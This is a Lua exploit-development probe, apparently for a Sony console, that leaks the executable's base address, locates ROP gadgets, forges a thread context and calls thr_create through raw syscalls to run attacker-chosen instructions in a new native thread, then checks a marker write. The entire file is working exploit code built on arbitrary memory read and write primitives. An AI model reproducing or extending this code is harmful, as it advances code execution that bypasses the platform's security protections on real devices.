-- CRASH_CLASS: LOW
-- PROBE 531m: Minimal thr_create test - reproduce 156d
--
-- 531k/531l: rv=-1 (context rejected). Reproduce 156d to verify
-- our context setup is correct.
--
-- 156d: RIP=mov [rdi],rax;ret, RAX=0xDEADBEEFCAFE, RDI=marker page
-- Result: marker written, thread alive.
--
-- From THREADING_ALIVE_14_10.md:
-- Sony layout: +0x060 = R10 (NOT rcx!)
-- +0x048=RDI, +0x050=RSI, +0x058=RDX, +0x060=R10
-- +0x068=R8, +0x070=R9, +0x078=RAX

print("=== PROBE 531m: THR TEST ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function hexq(v)
    if v == nil then return "nil" end
    local h, l
    if type(v) == "table" and v.h then h, l = v.h, v.l
    else h, l = 0, N(v) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print(string.format("pid=%d", pid))

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa, uint64(0)) end)
end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local eb_lo = rd(N(ib) + 0x108) or 0
local eb_hi = rd(N(ib) + 0x10C) or 0
if eb_lo < 0 then eb_lo = eb_lo + 0x100000000 end
if eb_hi < 0 then eb_hi = eb_hi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print(string.format("eb=%s", hexq(eb)))

-- Gadgets
local mov_rdi_rax_ret = eb + uint64(0x92C67)  -- mov [rdi], rax; ret
local jmp_self = eb + uint64(0x1481)           -- jmp $ (infinite loop)

-- Shared page
local sc_477 = mk(477)
local shared = sc_477(uint64(0), uint64(0x4000), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local sn = N(shared)
wq(sn, uint64(0))
print(string.format("shared=0x%X", sn))

-- Child stack
local stack_sz = 0x200000
local child_stack = sc_477(uint64(0), uint64(stack_sz), uint64(0x33),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local csn = N(child_stack)
-- Stack top for RSP
local rsp_val = csn + stack_sz - 0x100
-- Put jmp_self as return address (after mov [rdi],rax;ret, child parks)
wq(rsp_val, jmp_self)

-- Build context - EXACT replica of 156d approach
local ctx = memory.alloc(0x500)
for off = 0, 0x4BF, 8 do wq(N(ctx) + off, uint64(0)) end

-- Gates
wd(N(ctx) + 0x108, 0x480)
wd(N(ctx) + 0x0D0, 0)     -- 156c used 0, not 4
wd(N(ctx) + 0x110, 0x10000)

-- Segments
wd(N(ctx) + 0x0C0, 0x43)
wd(N(ctx) + 0x100, 0x3B)

-- RFLAGS
wq(N(ctx) + 0x0F0, uint64(0x202))

-- RIP = mov [rdi], rax; ret
wq(N(ctx) + 0x0E0, mov_rdi_rax_ret)
-- RSP
wq(N(ctx) + 0x0F8, uint64(rsp_val))

-- GPRs (Sony layout):
-- +0x048 = RDI (where to write)
wq(N(ctx) + 0x048, uint64(sn))
-- +0x078 = RAX (what to write)
wq(N(ctx) + 0x078, uint64("0xDEADBEEFCAFE"))

print("  rip=mov[rdi],rax;ret rdi=shared rax=0xDEADBEEFCAFE")

-- Spawn
local tid_out = memory.alloc(8)
wq(N(tid_out), uint64(0))
local ok_tc, rv_tc = pcall(function()
    return mk(430)(uint64(N(ctx)), uint64(N(tid_out)), uint64(0))
end)
print(string.format("  rv=%s tid=%s", ok_tc and hexq(rv_tc) or "FAIL", hexq(rq(N(tid_out)))))

-- Wait
local dummy = 0
for i = 1, 1000000 do dummy = dummy + 1 end

-- Check marker
local result = rq(sn)
print(string.format("  marker=%s", hexq(result)))

local rn = N(result)
if rn == 0 then
    print("  FAILED: marker not written (child did not execute)")
else
    print("  SUCCESS: child wrote to shared page!")
end

-- Verify thread is alive (via thr_kill)
local tid = rq(N(tid_out))
if tid and N(tid) ~= 0 then
    local ok_k, rv_k = pcall(function()
        return mk(433)(uint64(N(tid)), uint64(0))
    end)
    print(string.format("  thr_kill(0)=%s", ok_k and hexq(rv_k) or "FAIL"))
end

print("")
print("=== 531m DONE ===")
